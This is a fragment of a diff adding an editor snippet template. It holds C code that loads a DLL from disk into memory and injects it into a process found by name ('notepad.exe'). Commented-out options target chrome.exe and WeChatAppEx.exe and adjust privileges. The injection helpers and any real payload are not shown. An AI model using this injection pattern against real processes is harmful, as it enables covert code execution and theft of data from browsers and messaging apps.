0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
+    // LPVOID base = (char*)DLLBit;
+    char* FileName = "./test_dll.dll";
+    LPVOID base = v_ReadInMemory(FileName);
+
+    // v_EnumProcessAll();
+    // v_EnumProcessByName("chrome.exe");
+    // v_EnumProcessByNameAndCommand("chrome.exe", L"");
+    // v_EnumProcessByNameAndPosRevCommand("WeChatAppEx.exe", L"", L"--type");
+    // printf("[*] IsPaeEnalbed: %d\n", v_PaeEnalbed());
+    // printf("[*] IsMultiCore: %d\n", v_IsMultiCore());
+    // printf("[*] AdjustPrivileges: %d\n", v_AdjustPrivileges());
+
+    HANDLE proc;
+    char* ProcessName;
+    ProcessName = "notepad.exe";
+    proc = v_FindProcessByName(ProcessName);
+    // 用命令行字符串匹配来辅助定位进程（正向选择）
+    // proc = v_FindProcessByNameAndCommand("chrome.exe", L"16245339023");
+    // 用命令行字符串匹配来辅助定位进程（正反向选择）
+    // proc = v_FindProcessByNameAndPosRevCommand("chrome.exe", L"", L"16245339023");
+
+    printf("%d\n", proc);
+    v_InjectDllRef(base, proc);
+}
+]]>
+    </content>
+    <tabTrigger>ccc</tabTrigger>
+    <scope>source.c</scope>
+</snippet>
